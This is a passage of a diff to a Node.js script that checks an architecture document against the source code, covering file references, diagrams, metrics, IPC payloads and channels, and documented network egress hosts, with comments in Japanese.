+      [...body.matchAll(/^\s*(?:readonly\s+)?(\w+)\??:/gm)].map((x) => x[1]),
+    );
+    const documented = new Set(
+      fields
+        .split(',')
+        .map((f) => f.trim().replace(/\?.*$/, '').trim())
+        .filter((f) => f !== ''),
+    );
+    const extra = [...documented].filter((f) => !real.has(f)).sort();
+    const missing = [...real].filter((f) => !documented.has(f)).sort();
+    if (extra.length > 0 || missing.length > 0) {
+      const parts = [];
+      if (extra.length > 0) parts.push(`文書にだけ在る: ${extra.join(', ')}`);
+      if (missing.length > 0) parts.push(`実装にだけ在る: ${missing.join(', ')}`);
+      failures.push({
+        archLine,
+        ref: `${svc}.${action}`,
+        reason: `payload 欄が実装の ${camel} と違います (${parts.join(' / ')})`,
+      });
+    }
+  }
+  return { checked, failures };
+}
+
 function main() {
+  if (process.argv.includes('--self-test')) return selfTest();
+
   const arch = readFileSafe(ARCH_FILE);
   if (arch === null) {
     console.error(`ERROR: cannot read ${ARCH_FILE}`);
@@ -358,12 +2289,37 @@ function main() {
   }
 
   const refs = verifyReferences(arch);
+  const diagrams = verifyDiagramRefs(arch);
   const metrics = verifyMetrics(arch);
+  const payloads = verifyActionPayloads(arch);
+  const coverage = verifyActionCoverage(arch);
+  const egress = verifyEgressHosts(arch);
+  const channels = verifyIpcChannels(arch);
 
   console.log(`Verified ${refs.successCount} file:line references in docs/ARCHITECTURE.md`);
+  console.log(`Verified ${diagrams.successCount} file:line reference(s) inside mermaid diagrams`);
   console.log(`Verified ${metrics.ok.length} live metric(s): ${metrics.ok.join(', ') || '(none)'}`);
+  console.log(`Verified ${payloads.checked} IPC action payload row(s) against their interfaces`);
+  console.log(
+    `Verified ${coverage.registered} registered action(s) all have a payload row`
+      + (coverage.unreadable.length > 0
+        ? ` (静的に読めない ACTIONS: ${coverage.unreadable.join(', ')})`
+        : ''),
+  );
+  console.log(
+    `Verified ${egress.scanned} host(s) in src (main: every literal / shared + renderer: send context) against the §3.3 egress matrix (${egress.documented} documented)`,
+  );
+  console.log(`Verified ${channels.registered} IPC channel(s) all have a §1.4 contract row`);
 
-  const allFailures = [...refs.failures, ...metrics.failures];
+  const allFailures = [
+    ...refs.failures,
+    ...diagrams.failures,
+    ...metrics.failures,
+    ...payloads.failures,
+    ...coverage.failures,
+    ...egress.failures,
+    ...channels.failures,
+  ];
   if (allFailures.length === 0) {
     console.log('✅ all references + metrics resolve');
     return 0;
@@ -376,4 +2332,22 @@ function main() {
   return 1;
 }
 
-process.exit(main());
+/*
+ * **走査の中身を外から読めるようにする** (2026-09-20 · パス 340)。
+ * `verifyEgressHosts` は「表に無い宛先」だけを落としており、逆向き
+ * (表に在るのに走査で見つからない行) は誰も見ていなかった。逆向きの台帳は
+ * `src/shared/__tests__/egressMatrixReverse.test.ts` が持つので、そこから
+ * **同じ 1 つの解析**を呼べるように export する (数え方を 2 つ持たない)。
+ */
+module.exports = {
+  countStaticIts,
+  documentedEgressHosts,
+  egressHostsInFile,
+  walkEgressTree,
+  readFileSafe,
+  EGRESS_TREES,
+  EGRESS_NOT_FETCHED,
+  REPO_ROOT,
+};
+
+if (require.main === module) process.exit(main());
